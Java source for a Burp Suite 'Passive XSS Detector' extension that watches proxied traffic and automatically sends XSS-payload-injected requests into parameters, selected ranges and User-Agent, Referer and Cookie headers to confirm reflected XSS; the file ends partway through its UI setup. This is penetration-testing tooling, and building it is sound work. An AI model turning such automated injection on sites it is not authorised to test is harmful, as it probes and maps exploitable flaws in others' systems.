package burp;

import javax.swing.BorderFactory;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComponent;
import javax.swing.JLabel;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JSpinner;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.ListSelectionModel;
import javax.swing.SpinnerNumberModel;
import javax.swing.SwingUtilities;
import javax.swing.event.ChangeListener;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import javax.swing.event.ListSelectionEvent;
import javax.swing.table.AbstractTableModel;
import java.awt.BorderLayout;
import java.awt.CardLayout;
import java.awt.FlowLayout;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Objects;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, IMessageEditorController, IExtensionStateListener, IHttpListener, IContextMenuFactory {
    private static final String EXTENSION_NAME = "Passive XSS Detector";
    private static final String MARKER_HEADER_NAME = "X-Passive-XSS";
    private static final String MARKER_HEADER_VALUE = "1";
    private static final String SETTING_PASSIVE_ENABLED = "passive.enabled";
    private static final String SETTING_PASSIVE_THREADS = "passive.threads";
    private static final String SETTING_PASSIVE_QUEUE = "passive.queue";
    private static final String SETTING_PASSIVE_MAX_PER_PARAM = "passive.maxPerParam";
    private static final String SETTING_PASSIVE_FILE_LIMIT = "passive.fileLimit";
    private static final String SETTING_ACTIVE_MAX_PER_POINT = "active.maxPerPoint";
    private static final String SETTING_BRUTE_FUZZ_ENABLED = "auto.bruteFuzz.enabled";
    private static final String SETTING_HEADER_FUZZ_ENABLED = "auto.headerFuzz.enabled";
    private static final String SETTING_BLACKLIST_DOMAINS = "blacklist.domains";

    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;

    private final Object findingsLock = new Object();
    private final List<Finding> findings = new ArrayList<>();
    private final Set<String> seen = Collections.synchronizedSet(new HashSet<>());
    private final Set<String> triggeredKeys = Collections.synchronizedSet(new HashSet<>());
    private final Set<String> queuedKeys = Collections.synchronizedSet(new HashSet<>());
    private volatile LruSet attemptedPacketKeys = new LruSet(6000);
    private volatile LruSet seenPathOnlyKeys = new LruSet(6000);
    private volatile LruSet seenPathQueryKeys = new LruSet(12000);
    private volatile LruSet seenPathParamSigKeys = new LruSet(12000);

    private final Object payloadsLock = new Object();
    private volatile List<String> activePayloads;
    private volatile Set<String> activePayloadSet;

    private static final int DEFAULT_ACTIVE_MAX_PER_POINT = 30;
    private static final int DEFAULT_PASSIVE_MAX_PER_PARAM = 6;
    private static final int DEFAULT_PASSIVE_THREADS = 3;
    private static final int DEFAULT_PASSIVE_QUEUE = 300;
    private static final int DEFAULT_PASSIVE_FILE_LIMIT = 0;
    private static final int AUTO_MAX_GET_PARAMS = 20;
    private static final int AUTO_MAX_POST_PARAMS = 20;

    private volatile boolean passiveEnabled = true;
    private volatile boolean bruteFuzzEnabled = false;
    private volatile boolean headerFuzzEnabled = false;
    private volatile String blacklistDomainsText = "";
    private volatile List<String> blacklistDomains = Collections.emptyList();
    private volatile int passiveThreads = DEFAULT_PASSIVE_THREADS;
    private volatile int passiveQueueSize = DEFAULT_PASSIVE_QUEUE;
    private volatile int passiveMaxPayloadsPerParam = DEFAULT_PASSIVE_MAX_PER_PARAM;
    private volatile int passiveFilePayloadLimit = DEFAULT_PASSIVE_FILE_LIMIT;
    private volatile int activeMaxPayloadsPerPoint = DEFAULT_ACTIVE_MAX_PER_POINT;

    private volatile ExecutorService passiveFuzzExecutor;

    private volatile LastObserved lastObserved;

    private FindingsTableModel tableModel;
    private JTable findingsTable;
    private IMessageEditor requestViewer;
    private IMessageEditor responseViewer;

    private volatile Finding selectedFinding;

    private JPanel mainPanel;
    private CardLayout detailsCardLayout;
    private JPanel detailsCardPanel;
    private static final String DETAILS_CARD_PLACEHOLDER = "PLACEHOLDER";
    private static final String DETAILS_CARD_MESSAGES = "MESSAGES";

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();

        callbacks.setExtensionName(EXTENSION_NAME);
        callbacks.registerScannerCheck(this);
        callbacks.registerExtensionStateListener(this);
        callbacks.registerHttpListener(this);
        callbacks.registerContextMenuFactory(this);

        loadSettings();
        rebuildPassiveExecutor();

        SwingUtilities.invokeLater(() -> {
            buildUi();
            callbacks.addSuiteTab(BurpExtender.this);
        });
    }

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        if (messageIsRequest) {
            return;
        }
        if (!passiveEnabled) {
            return;
        }
        if (messageInfo == null || messageInfo.getRequest() == null || messageInfo.getResponse() == null) {
            return;
        }
        if (isSelfGeneratedRequest(messageInfo.getRequest())) {
            return;
        }
        IRequestInfo requestInfo = helpers.analyzeRequest(messageInfo);
        if (requestContainsKnownPayload(requestInfo)) {
            return;
        }
        URL url = requestInfo.getUrl();
        if (shouldSkip(url, messageInfo.getHttpService())) {
            return;
        }
        try {
            byte[] req = messageInfo.getRequest();
            if (req != null && req.length > 0) {
                lastObserved = new LastObserved(messageInfo.getHttpService(), Arrays.copyOf(req, req.length));
            }
        } catch (Exception ignored) {
        }
        byte[] responseBytes = messageInfo.getResponse();
        if (responseBytes == null || responseBytes.length == 0) {
            return;
        }
        IResponseInfo responseInfo = helpers.analyzeResponse(responseBytes);
        if (responseInfo == null || !isCandidateResponse(responseInfo.getHeaders())) {
            return;
        }
        int bodyOffset = responseInfo.getBodyOffset();
        String responseText = helpers.bytesToString(responseBytes);
        if (bodyOffset < 0 || bodyOffset >= responseText.length()) {
            return;
        }
        String body = responseText.substring(bodyOffset);
        queueAutoFuzzJobs(messageInfo, requestInfo, url, body);
        queuePassiveConfirmJobs(messageInfo, requestInfo, url, body);
    }

    private boolean isSelfGeneratedRequest(byte[] requestBytes) {
        if (requestBytes == null || requestBytes.length == 0) {
            return false;
        }
        try {
            IRequestInfo info = helpers.analyzeRequest(requestBytes);
            for (String h : info.getHeaders()) {
                int idx = h.indexOf(':');
                if (idx <= 0) {
                    continue;
                }
                String name = h.substring(0, idx).trim();
                if (MARKER_HEADER_NAME.equalsIgnoreCase(name)) {
                    return true;
                }
            }
        } catch (Exception ignored) {
        }
        return false;
    }

    private byte[] addMarkerHeader(byte[] requestBytes) {
        if (requestBytes == null || requestBytes.length == 0) {
            return requestBytes;
        }
        try {
            IRequestInfo info = helpers.analyzeRequest(requestBytes);
            List<String> headers = new ArrayList<>(info.getHeaders());
            for (String h : headers) {
                int idx = h.indexOf(':');
                if (idx <= 0) {
                    continue;
                }
                String name = h.substring(0, idx).trim();
                if (MARKER_HEADER_NAME.equalsIgnoreCase(name)) {
                    return requestBytes;
                }
            }
            headers.add(MARKER_HEADER_NAME + ": " + MARKER_HEADER_VALUE);
            byte[] body = Arrays.copyOfRange(requestBytes, info.getBodyOffset(), requestBytes.length);
            return helpers.buildHttpMessage(headers, body);
        } catch (Exception ignored) {
            return requestBytes;
        }
    }

    private boolean requestContainsKnownPayload(IRequestInfo requestInfo) {
        if (requestInfo == null) {
            return false;
        }
        Set<String> fileSet = getActivePayloadSet();
        for (IParameter p : requestInfo.getParameters()) {
            if (p.getType() != IParameter.PARAM_URL && p.getType() != IParameter.PARAM_BODY) {
                continue;
            }
            String raw = p.getValue();
            if (raw == null) {
                continue;
            }
            if (isKnownPayloadValue(raw, fileSet)) {
                return true;
            }
            try {
                String decoded = helpers.urlDecode(raw);
                if (isKnownPayloadValue(decoded, fileSet)) {
                    return true;
                }
            } catch (Exception ignored) {
            }
        }
        return false;
    }

    private static boolean isKnownPayloadValue(String value, Set<String> fileSet) {
        if (value == null) {
            return false;
        }
        String v = value.trim();
        if (v.isEmpty()) {
            return false;
        }
        if (fileSet != null && fileSet.contains(v)) {
            return true;
        }
        for (String d : defaultGeneratedPayloads()) {
            if (v.equals(d)) {
                return true;
            }
        }
        return false;
    }

    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
        if (invocation == null) {
            return null;
        }
        IHttpRequestResponse[] messages = invocation.getSelectedMessages();
        if (messages == null || messages.length == 0) {
            return null;
        }

        JMenuItem item = new JMenuItem("Send selection to XSS fuzz");
        item.addActionListener(e -> {
            try {
                sendSelectionToFuzz(invocation);
            } catch (Exception ignored) {
            }
        });
        return Collections.singletonList(item);
    }

    private void sendSelectionToFuzz(IContextMenuInvocation invocation) {
        if (invocation == null) {
            return;
        }
        IHttpRequestResponse[] messages = invocation.getSelectedMessages();
        int[] bounds = invocation.getSelectionBounds();
        if (messages == null || messages.length == 0) {
            return;
        }
        
        // Handle case where bounds are null or empty (no selection)
        boolean hasSelection = bounds != null && bounds.length >= 2 && bounds[1] > bounds[0];
        
        if (!hasSelection) {
            // Auto identify parameters for all selected messages
            for (IHttpRequestResponse msg : messages) {
                if (msg == null || msg.getRequest() == null) {
                    continue;
                }
                
                // Ensure we have a response for reflection check
                IHttpRequestResponse msgWithResponse = msg;
                if (msg.getResponse() == null || msg.getResponse().length == 0) {
                    msgWithResponse = callbacks.makeHttpRequest(msg.getHttpService(), msg.getRequest());
                }
                
                if (msgWithResponse.getResponse() == null || msgWithResponse.getResponse().length == 0) {
                    continue;
                }
                
                IRequestInfo requestInfo = helpers.analyzeRequest(msgWithResponse);
                URL url = requestInfo.getUrl();
                byte[] responseBytes = msgWithResponse.getResponse();
                IResponseInfo responseInfo = helpers.analyzeResponse(responseBytes);
                
                int bodyOffset = responseInfo.getBodyOffset();
                String responseText = helpers.bytesToString(responseBytes);
                String body = "";
                if (bodyOffset >= 0 && bodyOffset < responseText.length()) {
                    body = responseText.substring(bodyOffset);
                }
                
                queueAutoFuzzJobs(msgWithResponse, requestInfo, url, body);
            }
            return;
        }

        int start = Math.max(0, bounds[0]);
        int end = Math.max(0, bounds[1]);

        int ctx = invocation.getInvocationContext();
        boolean selectionInRequest = ctx == IContextMenuInvocation.CONTEXT_MESSAGE_EDITOR_REQUEST
                || ctx == IContextMenuInvocation.CONTEXT_MESSAGE_VIEWER_REQUEST
                || ctx == IContextMenuInvocation.CONTEXT_PROXY_HISTORY
                || ctx == IContextMenuInvocation.CONTEXT_TARGET_SITE_MAP_TABLE
                || ctx == IContextMenuInvocation.CONTEXT_TARGET_SITE_MAP_TREE;

        for (IHttpRequestResponse msg : messages) {
            if (msg == null || msg.getRequest() == null) {
                continue;
            }
            byte[] src = selectionInRequest ? msg.getRequest() : msg.getResponse();
            if (src == null || src.length == 0) {
                continue;
            }
            int s = Math.min(start, src.length);
            int ee = Math.min(end, src.length);
            if (ee <= s) {
                continue;
            }
            if (selectionInRequest) {
                manualFuzzBySelectionRange(msg, s, ee);
                continue;
            }
            String selected = helpers.bytesToString(Arrays.copyOfRange(src, s, ee)).trim();
            if (!selected.isEmpty()) {
                manualFuzzBySelection(msg, selected);
            }
        }
    }

    private void manualFuzzBySelectionRange(IHttpRequestResponse base, int start, int end) {
        if (base == null || base.getRequest() == null) {
            return;
        }
        byte[] requestBytes = base.getRequest();
        int s = Math.max(0, Math.min(start, requestBytes.length));
        int e = Math.max(0, Math.min(end, requestBytes.length));
        if (e <= s) {
            return;
        }

        String selected = helpers.bytesToString(Arrays.copyOfRange(requestBytes, s, e));
        List<int[]> targets = new ArrayList<>();

        if (selected.contains("=") || selected.contains("&")) {
            Matcher m = Pattern.compile("([^=&?]+)=([^&]*)").matcher(selected);
            while (m.find()) {
                targets.add(new int[]{s + m.start(2), s + m.end(2)});
            }
        }

        if (targets.isEmpty()) {
            targets.add(new int[]{s, e});
        }

        for (int[] range : targets) {
            triggerManualFuzz(base, range[0], range[1]);
        }
    }

    private void triggerManualFuzz(IHttpRequestResponse base, int s, int e) {
        byte[] requestBytes = base.getRequest();
        IRequestInfo requestInfo = helpers.analyzeRequest(base);
        URL url = requestInfo.getUrl();
        if (shouldSkip(url, base.getHttpService())) {
            return;
        }

        String targetKey = buildTargetKey(base.getHttpService(), requestInfo.getMethod(), url, "RAWSEL", s + "-" + e);
        if (triggeredKeys.contains(targetKey)) {
            return;
        }

        String packetKeyPrefix = buildPacketKeyPrefix(base.getHttpService(), requestInfo.getMethod(), url, requestInfo, requestBytes);
        String packetKey = packetKeyPrefix + "|RAWSEL|" + s + "-" + e;
        if (!attemptedPacketKeys.add(packetKey)) {
            return;
        }

        ExecutorService exec = passiveFuzzExecutor;
        if (exec == null) {
            return;
        }

        IHttpRequestResponse baseWithResponse = base;
        if (baseWithResponse.getResponse() == null || baseWithResponse.getResponse().length == 0) {
            baseWithResponse = callbacks.makeHttpRequest(base.getHttpService(), base.getRequest());
        }
        byte[] responseBytes = baseWithResponse.getResponse();
        String body = "";
        if (responseBytes != null && responseBytes.length > 0) {
            IResponseInfo responseInfo = helpers.analyzeResponse(responseBytes);
            if (responseInfo != null) {
                String responseText = helpers.bytesToString(responseBytes);
                int bodyOffset = responseInfo.getBodyOffset();
                if (bodyOffset >= 0 && bodyOffset < responseText.length()) {
                    body = responseText.substring(bodyOffset);
                }
            }
        }

        String responseBody = body;
        int reflectedIndex = 0;
        try {
            String selected = helpers.bytesToString(Arrays.copyOfRange(requestBytes, s, e));
            ReflectionMatch match = firstReflectionMatch(responseBody, selected, selected);
            reflectedIndex = match == null ? 0 : match.index;
        } catch (Exception ignored) {
        }
        int reflectedIndexFinal = reflectedIndex;

        final IHttpRequestResponse baseForFuzz = baseWithResponse;
        final IRequestInfo reqInfoForFuzz = requestInfo;
        final URL urlForFuzz = url;
        final String bodyForFuzz = responseBody;
        final int sFinal = s;
        final int eFinal = e;
        final String targetKeyFinal = targetKey;
        exec.execute(() -> {
            try {
                confirmOneRawSelectionByPassiveSending(baseForFuzz, reqInfoForFuzz, urlForFuzz, bodyForFuzz, reflectedIndexFinal, sFinal, eFinal, targetKeyFinal);
            } catch (Exception ignored) {
            }
        });
    }

    private void confirmOneRawSelectionByPassiveSending(IHttpRequestResponse baseRequestResponse,
                                                        IRequestInfo requestInfo,
                                                        URL url,
                                                        String responseBody,
                                                        int reflectedIndex,
                                                        int start,
                                                        int end,
                                                        String targetKey) {
        String stopKey = buildStopKey(baseRequestResponse.getHttpService(), requestInfo.getMethod(), url);
        if (triggeredKeys.contains(targetKey) || triggeredKeys.contains(stopKey)) {
            return;
        }
        byte[] baseReq = baseRequestResponse.getRequest();
        if (baseReq == null || baseReq.length == 0) {
            return;
        }
        int s = Math.max(0, Math.min(start, baseReq.length));
        int e = Math.max(0, Math.min(end, baseReq.length));
        if (e <= s) {
            return;
        }

        int firstLineEnd = -1;
        try {
            for (int i = 0; i + 1 < baseReq.length; i++) {
                if (baseReq[i] == '\r' && baseReq[i + 1] == '\n') {
                    firstLineEnd = i + 2;
                    break;
                }
            }
        } catch (Exception ignored) {
        }
        boolean inRequestLine = firstLineEnd > 0 && s < firstLineEnd;

        List<String> candidates = buildPassiveCandidates(responseBody, reflectedIndex);
        int max = passiveMaxPayloadsPerParam <= 0 ? candidates.size() : Math.min(candidates.size(), passiveMaxPayloadsPerParam);
        for (int i = 0; i < max; i++) {
            if (triggeredKeys.contains(targetKey) || triggeredKeys.contains(stopKey)) {
                return;
            }
            String payload = candidates.get(i);
            if (payload == null) {
                continue;
            }
            String v = payload.trim();
            if (v.isEmpty()) {
                continue;
            }
            if (inRequestLine) {
                try {
                    v = helpers.urlEncode(v);
                } catch (Exception ignored) {
                }
            } else {
                v = v.replace("\r", "").replace("\n", "");
            }

            byte[] injected = helpers.stringToBytes(v);
            byte[] attackRequest = concatReplaceRange(baseReq, s, e, injected);
            attackRequest = addMarkerHeader(attackRequest);

            IHttpRequestResponse attack = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), attackRequest);
            byte[] attackResponse = attack.getResponse();
            if (attackResponse == null || attackResponse.length == 0) {
                continue;
            }
            IResponseInfo attackResponseInfo = helpers.analyzeResponse(attackResponse);
            if (!isCandidateResponse(attackResponseInfo.getHeaders())) {
                continue;
            }
            if (!responseReflectsPayload(attackResponse, attackResponseInfo.getBodyOffset(), v)) {
                continue;
            }

            IHttpRequestResponsePersisted persisted = callbacks.saveBuffersToTempFiles(attack);
            String issueName = "XSS成功 (选中内容)";
            String severity = "High";
            String confidence = "Certain";

            IScanIssue issue = new GenericIssue(
                    url,
                    issueName,
                    buildTriggeredXssIssueDetail("选中内容", "range:" + s + "-" + e, v),
                    severity,
                    confidence,
                    new IHttpRequestResponse[]{persisted},
                    persisted.getHttpService()
            );

            triggeredKeys.add(targetKey);
            triggeredKeys.add(stopKey);
            callbacks.addScanIssue(issue);

            String uiKey = url.toString() + "|XSS成功|RAWSEL|" + s + "-" + e;
            if (seen.add(uiKey)) {
                addFinding(new Finding(
                        Instant.now().toEpochMilli(),
                        "XSS成功",
                        url,
                        requestInfo.getMethod(),
                        "RAWSEL",
                        severity,
                        confidence,
                        persisted
                ));
            }
            return;
        }
    }

    private static byte[] concatReplaceRange(byte[] src, int start, int end, byte[] replacement) {
        if (src == null) {
            return null;
        }
        int s = Math.max(0, Math.min(start, src.length));
        int e = Math.max(0, Math.min(end, src.length));
        if (e < s) {
            e = s;
        }
        int repLen = replacement == null ? 0 : replacement.length;
        byte[] out = new byte[s + repLen + (src.length - e)];
        System.arraycopy(src, 0, out, 0, s);
        if (repLen > 0) {
            System.arraycopy(replacement, 0, out, s, repLen);
        }
        System.arraycopy(src, e, out, s + repLen, src.length - e);
        return out;
    }

    private void manualFuzzBySelection(IHttpRequestResponse base, String selected) {
        IRequestInfo requestInfo = helpers.analyzeRequest(base);
        URL url = requestInfo.getUrl();
        if (shouldSkip(url, base.getHttpService())) {
            return;
        }

        IParameter matchedParam = null;
        for (IParameter p : requestInfo.getParameters()) {
            if (p.getType() != IParameter.PARAM_URL && p.getType() != IParameter.PARAM_BODY) {
                continue;
            }
            String raw = p.getValue();
            if (raw == null) {
                continue;
            }
            if (selected.equals(raw)) {
                matchedParam = p;
                break;
            }
            try {
                String decoded = helpers.urlDecode(raw);
                if (selected.equals(decoded)) {
                    matchedParam = p;
                    break;
                }
            } catch (Exception ignored) {
            }
        }
        if (matchedParam == null) {
            return;
        }

        IHttpRequestResponse baseWithResponse = base;
        if (baseWithResponse.getResponse() == null || baseWithResponse.getResponse().length == 0) {
            baseWithResponse = callbacks.makeHttpRequest(base.getHttpService(), base.getRequest());
        }
        byte[] responseBytes = baseWithResponse.getResponse();
        String body = "";
        if (responseBytes != null && responseBytes.length > 0) {
            IResponseInfo responseInfo = helpers.analyzeResponse(responseBytes);
            if (responseInfo != null) {
                String responseText = helpers.bytesToString(responseBytes);
                int bodyOffset = responseInfo.getBodyOffset();
                if (bodyOffset >= 0 && bodyOffset < responseText.length()) {
                    body = responseText.substring(bodyOffset);
                }
            }
        }

        String rawValue = matchedParam.getValue();
        String decodedValue;
        try {
            decodedValue = helpers.urlDecode(rawValue);
        } catch (Exception ignored) {
            decodedValue = rawValue;
        }
        ReflectionMatch match = firstReflectionMatch(body, rawValue, decodedValue);
        int reflectedIndex = match == null ? 0 : match.index;

        String targetName = matchedParam.getName();
        String targetKey = buildTargetKey(base.getHttpService(), requestInfo.getMethod(), url, "PASSIVE", targetName);

        String packetKeyPrefix = buildPacketKeyPrefix(base.getHttpService(), requestInfo.getMethod(), url, requestInfo, base.getRequest());
        String packetKey = packetKeyPrefix + "|MANUAL|" + matchedParam.getType() + "|" + targetName;
        if (!attemptedPacketKeys.add(packetKey)) {
            return;
        }

        ExecutorService exec = passiveFuzzExecutor;
        final IHttpRequestResponse baseForFuzz = baseWithResponse;
        final IRequestInfo reqInfoForFuzz = requestInfo;
        final URL urlForFuzz = url;
        final String bodyForFuzz = body;
        final int reflectedIndexForFuzz = reflectedIndex;
        final IParameter paramForFuzz = matchedParam;
        final String targetKeyForFuzz = targetKey;
        Runnable task = () -> {
            try {
                confirmOneParamByPassiveSending(baseForFuzz, reqInfoForFuzz, urlForFuzz, bodyForFuzz, reflectedIndexForFuzz, paramForFuzz, targetKeyForFuzz);
            } catch (Exception ignored) {
            }
        };
        if (exec != null) {
            exec.execute(task);
        } else {
            Thread t = new Thread(task, "PassiveXSS-ManualFuzz");
            t.setDaemon(true);
            try {
                t.setPriority(Math.max(Thread.MIN_PRIORITY, Thread.NORM_PRIORITY - 1));
            } catch (Exception ignored) {
            }
            t.start();
        }
    }

    private void fuzzHeadersBySelectedAsync(JButton button) {
        if (button != null) {
            button.setEnabled(false);
        }
        Thread t = new Thread(() -> {
            try {
                Finding f = selectedFinding;
                if (f != null && f.http != null && f.http.getRequest() != null) {
                    fuzzHeadersOnBaseRequest(f.http);
                    return;
                }
                LastObserved last = lastObserved;
                if (last == null || last.service == null || last.request == null || last.request.length == 0) {
                    return;
                }
                IHttpRequestResponse base = callbacks.makeHttpRequest(last.service, last.request);
                fuzzHeadersOnBaseRequest(base);
            } catch (Exception ignored) {
            } finally {
                if (button != null) {
                    SwingUtilities.invokeLater(() -> button.setEnabled(true));
                }
            }
        }, "PassiveXSS-HeaderFuzz");
        t.setDaemon(true);
        try {
            t.setPriority(Math.max(Thread.MIN_PRIORITY, Thread.NORM_PRIORITY - 1));
        } catch (Exception ignored) {
        }
        t.start();
    }

    private void fuzzHeadersOnBaseRequest(IHttpRequestResponse base) {
        if (base == null || base.getRequest() == null) {
            return;
        }
        IRequestInfo requestInfo = helpers.analyzeRequest(base);
        URL url = requestInfo.getUrl();
        if (shouldSkip(url, base.getHttpService())) {
            return;
        }

        IHttpRequestResponse baseWithResponse = base;
        if (baseWithResponse.getResponse() == null || baseWithResponse.getResponse().length == 0) {
            baseWithResponse = callbacks.makeHttpRequest(base.getHttpService(), base.getRequest());
        }
        byte[] responseBytes = baseWithResponse.getResponse();
        String body = "";
        if (responseBytes != null && responseBytes.length > 0) {
            IResponseInfo responseInfo = helpers.analyzeResponse(responseBytes);
            if (responseInfo != null) {
                String responseText = helpers.bytesToString(responseBytes);
                int bodyOffset = responseInfo.getBodyOffset();
                if (bodyOffset >= 0 && bodyOffset < responseText.length()) {
                    body = responseText.substring(bodyOffset);
                }
            }
        }

        ExecutorService exec = passiveFuzzExecutor;
        if (exec == null) {
            return;
        }

        String method = requestInfo.getMethod();
        String packetKeyPrefix = buildPacketKeyPrefix(base.getHttpService(), method, url, requestInfo, base.getRequest());
        queueHeaderFuzz(exec, baseWithResponse, requestInfo, url, body, packetKeyPrefix, "User-Agent");
        queueHeaderFuzz(exec, baseWithResponse, requestInfo, url, body, packetKeyPrefix, "Referer");
        queueHeaderFuzz(exec, baseWithResponse, requestInfo, url, body, packetKeyPrefix, "Cookie");
    }

    private void queueHeaderFuzz(ExecutorService exec,
                                 IHttpRequestResponse baseWithResponse,
                                 IRequestInfo requestInfo,
                                 URL url,
                                 String responseBody,
                                 String packetKeyPrefix,
                                 String headerName) {
        if (exec == null || baseWithResponse == null || requestInfo == null || url == null || headerName == null) {
            return;
        }
        String method = requestInfo.getMethod();
        String targetKey = buildTargetKey(baseWithResponse.getHttpService(), method, url, "HEADER", headerName);
        if (triggeredKeys.contains(targetKey)) {
            return;
        }

        String packetKey = packetKeyPrefix + "|HDR|" + headerName;
        if (!attemptedPacketKeys.add(packetKey)) {
            return;
        }
        if (!queuedKeys.add(packetKey)) {
            return;
        }

        String rawHeaderValue = extractHeaderValue(requestInfo.getHeaders(), headerName);
        ReflectionMatch match = rawHeaderValue == null ? null : firstReflectionMatch(responseBody, rawHeaderValue, rawHeaderValue);
        int reflectedIndex = match == null ? 0 : match.index;

        exec.execute(() -> {
            try {
                confirmOneHeaderByPassiveSending(baseWithResponse, requestInfo, url, responseBody, reflectedIndex, headerName, targetKey);
            } catch (Exception ignored) {
            } finally {
                queuedKeys.remove(packetKey);
            }
        });
    }

    private void confirmOneHeaderByPassiveSending(IHttpRequestResponse baseRequestResponse,
                                                  IRequestInfo requestInfo,
                                                  URL url,
                                                  String responseBody,
                                                  int reflectedIndex,
                                                  String headerName,
                                                  String targetKey) {
        String stopKey = buildStopKey(baseRequestResponse.getHttpService(), requestInfo.getMethod(), url);
        if (triggeredKeys.contains(targetKey) || triggeredKeys.contains(stopKey)) {
            return;
        }
        if (headerName == null || headerName.trim().isEmpty()) {
            return;
        }
        List<String> candidates = buildPassiveCandidates(responseBody, reflectedIndex);
        int max = passiveMaxPayloadsPerParam <= 0 ? candidates.size() : Math.min(candidates.size(), passiveMaxPayloadsPerParam);
        for (int i = 0; i < max; i++) {
            if (triggeredKeys.contains(targetKey) || triggeredKeys.contains(stopKey)) {
                return;
            }
            String payload = candidates.get(i);
            if (payload == null) {
                continue;
            }
            payload = payload.trim();
            if (payload.isEmpty()) {
                continue;
            }

            byte[] attackRequest = buildHeaderInjectedRequest(baseRequestResponse.getRequest(), requestInfo, headerName, payload);
            attackRequest = addMarkerHeader(attackRequest);
            IHttpRequestResponse attack = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), attackRequest);
            byte[] attackResponse = attack.getResponse();
            if (attackResponse == null || attackResponse.length == 0) {
                continue;
            }
            IResponseInfo attackResponseInfo = helpers.analyzeResponse(attackResponse);
            if (!isCandidateResponse(attackResponseInfo.getHeaders())) {
                continue;
            }

            if (!responseReflectsPayload(attackResponse, attackResponseInfo.getBodyOffset(), payload)) {
                continue;
            }

            IHttpRequestResponsePersisted persisted = callbacks.saveBuffersToTempFiles(attack);
            String issueName = "XSS成功 (Header: " + headerName + ")";
            String severity = "High";
            String confidence = "Certain";

            IScanIssue issue = new GenericIssue(
                    url,
                    issueName,
                    buildTriggeredXssIssueDetail("Header", headerName, payload),
                    severity,
                    confidence,
                    new IHttpRequestResponse[]{persisted},
                    persisted.getHttpService()
            );

            triggeredKeys.add(targetKey);
            triggeredKeys.add(stopKey);
            callbacks.addScanIssue(issue);

            String uiKey = url.toString() + "|XSS成功|HEADER|" + headerName;
            if (seen.add(uiKey)) {
                addFinding(new Finding(
                        Instant.now().toEpochMilli(),
                        "XSS成功",
                        url,
                        requestInfo.getMethod(),
                        "Header:" + headerName,
                        severity,
                        confidence,
                        persisted
                ));
            }
            return;
        }
    }

    private static String extractHeaderValue(List<String> headers, String headerName) {
        if (headers == null || headers.isEmpty() || headerName == null) {
            return null;
        }
        for (String h : headers) {
            if (h == null) {
                continue;
            }
            int idx = h.indexOf(':');
            if (idx <= 0) {
                continue;
            }
            String name = h.substring(0, idx).trim();
            if (headerName.equalsIgnoreCase(name)) {
                return h.substring(idx + 1).trim();
            }
        }
        return null;
    }

    private byte[] buildHeaderInjectedRequest(byte[] baseRequestBytes, IRequestInfo requestInfo, String headerName, String payload) {
        if (baseRequestBytes == null || baseRequestBytes.length == 0 || requestInfo == null) {
            return baseRequestBytes;
        }
        try {
            List<String> headers = new ArrayList<>(requestInfo.getHeaders());
            boolean replaced = false;
            for (int i = 0; i < headers.size(); i++) {
                String h = headers.get(i);
                if (h == null) {
                    continue;
                }
                int idx = h.indexOf(':');
                if (idx <= 0) {
                    continue;
                }
                String name = h.substring(0, idx).trim();
                if (!headerName.equalsIgnoreCase(name)) {
                    continue;
                }
                if ("cookie".equalsIgnoreCase(headerName)) {
                    String cookieValue = h.substring(idx + 1).trim();
                    String newCookie = injectCookieValue(cookieValue, payload);
                    headers.set(i, "Cookie: " + newCookie);
                } else {
                    headers.set(i, name + ": " + payload);
                }
                replaced = true;
                break;
            }
            if (!replaced) {
                if ("cookie".equalsIgnoreCase(headerName)) {
                    headers.add("Cookie: user=" + payload);
                } else {
                    headers.add(headerName + ": " + payload);
                }
            }
            byte[] body = Arrays.copyOfRange(baseRequestBytes, requestInfo.getBodyOffset(), baseRequestBytes.length);
            return helpers.buildHttpMessage(headers, body);
        } catch (Exception ignored) {
            return baseRequestBytes;
        }
    }

    private static String injectCookieValue(String cookieHeaderValue, String payload) {
        String base = cookieHeaderValue == null ? "" : cookieHeaderValue.trim();
        String lower = base.toLowerCase(Locale.ROOT);
        int userIdx = lower.indexOf("user=");
        if (userIdx >= 0) {
            int valueStart = userIdx + "user=".length();
            int valueEnd = base.indexOf(';', valueStart);
            if (valueEnd < 0) {
                valueEnd = base.length();
            }
            String before = base.substring(0, valueStart);
            String after = base.substring(valueEnd);
            return before + payload + after;
        }
        if (base.isEmpty()) {
            return "user=" + payload;
        }
        if (base.endsWith(";")) {
            return base + " user=" + payload;
        }
        return base + "; user=" + payload;
    }

    private static final class LastObserved {
        private final IHttpService service;
        private final byte[] request;

        private LastObserved(IHttpService service, byte[] request) {
            this.service = service;
            this.request = request;
        }
    }

    private void buildUi() {
        tableModel = new FindingsTableModel(findings);
        findingsTable = new JTable(tableModel);
        findingsTable.setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION);
        findingsTable.getSelectionModel().addListSelectionListener(this::onSelectionChanged);

        requestViewer = callbacks.createMessageEditor(this, false);
        responseViewer = callbacks.createMessageEditor(this, false);

        JPanel settingsPanel = buildSettingsPanel();
        JPanel messagesPanel = new JPanel(new BorderLayout(8, 8));
        JPanel requestPanel = new JPanel(new BorderLayout());
